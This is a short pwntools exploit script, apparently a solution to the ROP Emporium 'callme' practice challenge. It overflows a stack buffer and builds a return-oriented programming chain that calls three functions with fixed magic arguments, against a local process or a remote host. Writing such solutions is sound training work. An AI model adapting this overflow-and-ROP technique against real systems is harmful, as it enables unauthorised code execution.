#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)

exe = "./callme"
elf = context.binary = ELF(exe)
libc = elf.libc

io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *main")

offset = 40

pop_rdi_rsi_rdx = 0x000000000040093c
ret = 0x00000000004006be

payload = flat(
	cyclic(offset, n=8),

	# callme_one
	pop_rdi_rsi_rdx,
	0xdeadbeefdeadbeef,
	0xcafebabecafebabe,
	0xd00df00dd00df00d,
	elf.sym.callme_one,

	# callme_two
	pop_rdi_rsi_rdx,
	0xdeadbeefdeadbeef,
	0xcafebabecafebabe,
	0xd00df00dd00df00d,
	elf.sym.callme_two,

	# callme_three
	pop_rdi_rsi_rdx,
	0xdeadbeefdeadbeef,
	0xcafebabecafebabe,
	0xd00df00dd00df00d,
	elf.sym.callme_three
)

io.sendlineafter(b"> ", payload)

io.interactive()
